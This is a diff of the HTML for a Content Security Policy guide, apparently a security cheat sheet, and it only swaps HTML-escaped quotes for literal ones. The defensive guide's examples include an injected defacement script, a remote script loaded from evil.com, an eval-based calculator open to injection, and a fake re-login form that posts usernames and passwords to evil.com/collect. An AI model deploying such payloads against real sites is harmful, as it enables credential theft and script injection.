@@ -4858,33 +4858,33 @@
 <p>CSP defends against XSS attacks in the following ways:</p>
 <h4 id="1-restricting-inline-scripts">1. Restricting Inline Scripts<a class="headerlink" href="#1-restricting-inline-scripts" title="Permanent link">&para;</a></h4>
 <p>By preventing the page from executing inline scripts, attacks like injecting</p>
-<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">innerHTML</span><span class="o">=</span><span class="s1">&#39;defaced&#39;</span><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">innerHTML</span><span class="o">=</span><span class="s1">'defaced'</span><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
 </code></pre></div>
 <p>will not work.</p>
 <h4 id="2-restricting-remote-scripts">2. Restricting Remote Scripts<a class="headerlink" href="#2-restricting-remote-scripts" title="Permanent link">&para;</a></h4>
 <p>By preventing the page from loading scripts from arbitrary servers, attacks like injecting</p>
-<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;https://evil.com/hacked.js&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">"https://evil.com/hacked.js"</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
 </code></pre></div>
 <p>will not work.</p>
 <h4 id="3-restricting-unsafe-javascript">3. Restricting Unsafe JavaScript<a class="headerlink" href="#3-restricting-unsafe-javascript" title="Permanent link">&para;</a></h4>
 <p>By preventing the page from executing text-to-JavaScript functions like <code>eval</code>, the website will be safe from vulnerabilities like the this:</p>
 <div class="highlight"><pre><span></span><code><span class="c1">// A Simple Calculator</span>
-<span class="kd">var</span><span class="w"> </span><span class="nx">op1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">getUrlParameter</span><span class="p">(</span><span class="s2">&quot;op1&quot;</span><span class="p">);</span>
-<span class="kd">var</span><span class="w"> </span><span class="nx">op2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">getUrlParameter</span><span class="p">(</span><span class="s2">&quot;op2&quot;</span><span class="p">);</span>
+<span class="kd">var</span><span class="w"> </span><span class="nx">op1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">getUrlParameter</span><span class="p">(</span><span class="s2">"op1"</span><span class="p">);</span>
+<span class="kd">var</span><span class="w"> </span><span class="nx">op2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">getUrlParameter</span><span class="p">(</span><span class="s2">"op2"</span><span class="p">);</span>
 <span class="kd">var</span><span class="w"> </span><span class="nx">sum</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">eval</span><span class="p">(</span><span class="sb">`</span><span class="si">${</span><span class="nx">op1</span><span class="si">}</span><span class="sb"> + </span><span class="si">${</span><span class="nx">op2</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
 <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`The sum is: </span><span class="si">${</span><span class="nx">sum</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
 </code></pre></div>
 <h4 id="4-restricting-form-submissions">4. Restricting Form submissions<a class="headerlink" href="#4-restricting-form-submissions" title="Permanent link">&para;</a></h4>
 <p>By restricting where HTML forms on your website can submit their data, injecting phishing forms won't work either.</p>
-<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">form</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;POST&quot;</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;https://evil.com/collect&quot;</span><span class="p">&gt;</span>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">form</span> <span class="na">method</span><span class="o">=</span><span class="s">"POST"</span> <span class="na">action</span><span class="o">=</span><span class="s">"https://evil.com/collect"</span><span class="p">&gt;</span>
 <span class="p">&lt;</span><span class="nt">h3</span><span class="p">&gt;</span>Session expired! Please login again.<span class="p">&lt;/</span><span class="nt">h3</span><span class="p">&gt;</span>
 <span class="p">&lt;</span><span class="nt">label</span><span class="p">&gt;</span>Username<span class="p">&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
-<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;text&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;username&quot;</span><span class="p">/&gt;</span>
+<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"text"</span> <span class="na">name</span><span class="o">=</span><span class="s">"username"</span><span class="p">/&gt;</span>
 
 <span class="p">&lt;</span><span class="nt">label</span><span class="p">&gt;</span>Password<span class="p">&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
-<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;password&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;pass&quot;</span><span class="p">/&gt;</span>
+<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"password"</span> <span class="na">name</span><span class="o">=</span><span class="s">"pass"</span><span class="p">/&gt;</span>
 
-<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;Submit&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;Login&quot;</span><span class="p">/&gt;</span>
+<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"Submit"</span> <span class="na">value</span><span class="o">=</span><span class="s">"Login"</span><span class="p">/&gt;</span>
 <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
 </code></pre></div>
 <h4 id="5-restricting-objects">5. Restricting Objects<a class="headerlink" href="#5-restricting-objects" title="Permanent link">&para;</a></h4>
@@ -4914,7 +4914,7 @@
 <h3 id="3-content-security-policy-meta-tag">3. Content-Security-Policy Meta Tag<a class="headerlink" href="#3-content-security-policy-meta-tag" title="Permanent link">&para;</a></h3>
 <p>Sometimes you cannot use the Content-Security-Policy header if you are, e.g., Deploying your HTML files in a CDN where the headers are out of your control.</p>
 <p>In this case, you can still use CSP by specifying a <code>http-equiv</code> meta tag in the HTML markup, like so:</p>
-<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">meta</span> <span class="na">http-equiv</span><span class="o">=</span><span class="s">&quot;Content-Security-Policy&quot;</span> <span class="na">content</span><span class="o">=</span><span class="s">&quot;...&quot;</span><span class="p">&gt;</span>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">meta</span> <span class="na">http-equiv</span><span class="o">=</span><span class="s">"Content-Security-Policy"</span> <span class="na">content</span><span class="o">=</span><span class="s">"..."</span><span class="p">&gt;</span>
 </code></pre></div>
 <p>Almost everything is still supported, including full XSS defenses. However, you will not be able to use <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors">framing protections</a>, <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox">sandboxing</a>, or a <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/report-to">CSP violation logging endpoint</a>.</p>
 <h3 id="warning">WARNING<a class="headerlink" href="#warning" title="Permanent link">&para;</a></h3>
@@ -4934,10 +4934,10 @@
 <h3 id="nonce-based">Nonce based<a class="headerlink" href="#nonce-based" title="Permanent link">&para;</a></h3>
 <p>Nonces are unique one-time-use random values that you generate for each HTTP response, and add to the Content-Security-Policy header, like so:</p>
 <div class="highlight"><pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">nonce</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">uuid</span><span class="p">.</span><span class="nx">v4</span><span class="p">();</span>
-<span class="nx">scriptSrc</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="sb">` &#39;nonce-</span><span class="si">${</span><span class="nx">nonce</span><span class="si">}</span><span class="sb">&#39;`</span><span class="p">;</span>
+<span class="nx">scriptSrc</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="sb">` 'nonce-</span><span class="si">${</span><span class="nx">nonce</span><span class="si">}</span><span class="sb">'`</span><span class="p">;</span>
 </code></pre></div>
 <p>You would then pass this nonce to your view (using nonces requires a non-static HTML) and render script tags that look something like this:</p>
-<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">script</span> <span class="na">nonce</span><span class="o">=</span><span class="s">&quot;&lt;%= nonce %&gt;&quot;</span><span class="p">&gt;</span>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">script</span> <span class="na">nonce</span><span class="o">=</span><span class="s">"&lt;%= nonce %&gt;"</span><span class="p">&gt;</span>
 <span class="w">    </span><span class="p">...</span>
 <span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
 </code></pre></div>
@@ -4945,7 +4945,7 @@
 <p><strong>Don't</strong> create a middleware that replaces all script tags with "script nonce=..." because attacker-injected scripts will then get the nonces as well. You need an actual HTML templating engine to use nonces.</p>
 <h3 id="hashes">Hashes<a class="headerlink" href="#hashes" title="Permanent link">&para;</a></h3>
 <p>When inline scripts are required, the <code>script-src 'hash_algo-hash'</code> is another option for allowing only specific scripts to execute.</p>
-<div class="highlight"><pre><span></span><code>Content-Security-Policy: script-src &#39;sha256-V2kaaafImTjn8RQTWZmF4IfGfQ7Qsqsw9GWaFjzFNPg=&#39;
+<div class="highlight"><pre><span></span><code>Content-Security-Policy: script-src 'sha256-V2kaaafImTjn8RQTWZmF4IfGfQ7Qsqsw9GWaFjzFNPg='
 </code></pre></div>
 <p>To get the hash, look at Google Chrome developer tools for violations like this:</p>
 <blockquote>
@@ -5061,15 +5061,15 @@
 <p>Based on those instructions, one of the following two policies can be used to apply a strict policy:</p>
 <h4 id="nonce-based-strict-policy">Nonce-based Strict Policy<a class="headerlink" href="#nonce-based-strict-policy" title="Permanent link">&para;</a></h4>
 <div class="highlight"><pre><span></span><code>Content-Security-Policy:
-  script-src &#39;nonce-{RANDOM}&#39; &#39;strict-dynamic&#39;;
-  object-src &#39;none&#39;;
-  base-uri &#39;none&#39;;
+  script-src 'nonce-{RANDOM}' 'strict-dynamic';
+  object-src 'none';
+  base-uri 'none';
 </code></pre></div>
 <h4 id="hash-based-strict-policy">Hash-based Strict Policy<a class="headerlink" href="#hash-based-strict-policy" title="Permanent link">&para;</a></h4>
 <div class="highlight"><pre><span></span><code>Content-Security-Policy:
-  script-src &#39;sha256-{HASHED_INLINE_SCRIPT}&#39; &#39;strict-dynamic&#39;;
-  object-src &#39;none&#39;;
-  base-uri &#39;none&#39;;
+  script-src 'sha256-{HASHED_INLINE_SCRIPT}' 'strict-dynamic';
+  object-src 'none';
+  base-uri 'none';
 </code></pre></div>
 <h3 id="basic-non-strict-csp-policy">Basic non-Strict CSP Policy<a class="headerlink" href="#basic-non-strict-csp-policy" title="Permanent link">&para;</a></h3>
 <p>This policy can be used if it is not possible to create a Strict Policy and it prevents cross-site framing and cross-site form-submissions. It will only allow resources from the originating domain for all the default level directives and will not allow inline scripts/styles to execute.</p>
@@ -5081,10 +5081,10 @@
 <li>There is no need for other websites to frame the website.</li>
 <li>There are no form-submissions to external websites.</li>
 </ul>
-<div class="highlight"><pre><span></span><code>Content-Security-Policy: default-src &#39;self&#39;; frame-ancestors &#39;self&#39;; form-action &#39;self&#39;;
+<div class="highlight"><pre><span></span><code>Content-Security-Policy: default-src 'self'; frame-ancestors 'self'; form-action 'self';
 </code></pre></div>
 <p>To tighten further, one can apply the following:</p>
-<div class="highlight"><pre><span></span><code>Content-Security-Policy: default-src &#39;none&#39;; script-src &#39;self&#39;; connect-src &#39;self&#39;; img-src &#39;self&#39;; style-src &#39;self&#39;; frame-ancestors &#39;self&#39;; form-action &#39;self&#39;;
+<div class="highlight"><pre><span></span><code>Content-Security-Policy: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self'; style-src 'self'; frame-ancestors 'self'; form-action 'self';
 </code></pre></div>
 <p>This policy allows images, scripts, AJAX, and CSS from the same origin and does not allow any other resources to load (e.g., object, frame, media, etc.).</p>
 <h3 id="upgrading-insecure-requests">Upgrading insecure requests<a class="headerlink" href="#upgrading-insecure-requests" title="Permanent link">&para;</a></h3>
@@ -5109,19 +5109,19 @@
 <h3 id="refactoring-inline-code">Refactoring inline code<a class="headerlink" href="#refactoring-inline-code" title="Permanent link">&para;</a></h3>
 <p>When <code>default-src</code> or <code>script-src*</code> directives are active, CSP by default disables any JavaScript code placed inline in the HTML source, such as this:</p>
 <div class="highlight"><pre><span></span><code><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
-<span class="kd">var</span><span class="w"> </span><span class="nx">foo</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;314&quot;</span>
+<span class="kd">var</span><span class="w"> </span><span class="nx">foo</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"314"</span>
 <span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
 </code></pre></div>
 <p>The inline code can be moved to a separate JavaScript file and the code in the page becomes:</p>
-<div class="highlight"><pre><span></span><code><span class="o">&lt;</span><span class="nx">script</span><span class="w"> </span><span class="nx">src</span><span class="o">=</span><span class="s2">&quot;app.js&quot;</span><span class="o">&gt;</span>
+<div class="highlight"><pre><span></span><code><span class="o">&lt;</span><span class="nx">script</span><span class="w"> </span><span class="nx">src</span><span class="o">=</span><span class="s2">"app.js"</span><span class="o">&gt;</span>
 <span class="o">&lt;</span><span class="err">/script&gt;</span>
 </code></pre></div>
 <p>With <code>app.js</code> containing the <code>var foo = "314"</code> code.</p>
 <p>The inline code restriction also applies to <code>inline event handlers</code>, so that the following construct will be blocked under CSP:</p>
-<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">button</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;button1&quot;</span> <span class="na">onclick</span><span class="o">=</span><span class="s">&quot;doSomething()&quot;</span><span class="p">&gt;</span>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">button</span> <span class="na">id</span><span class="o">=</span><span class="s">"button1"</span> <span class="na">onclick</span><span class="o">=</span><span class="s">"doSomething()"</span><span class="p">&gt;</span>
 </code></pre></div>
 <p>This should be replaced by <code>addEventListener</code> calls:</p>
-<div class="highlight"><pre><span></span><code><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&quot;button1&quot;</span><span class="p">).</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;click&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">doSomething</span><span class="p">);</span>
+<div class="highlight"><pre><span></span><code><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">"button1"</span><span class="p">).</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">'click'</span><span class="p">,</span><span class="w"> </span><span class="nx">doSomething</span><span class="p">);</span>
 </code></pre></div>
 <h2 id="references">References<a class="headerlink" href="#references" title="Permanent link">&para;</a></h2>
 <ul>
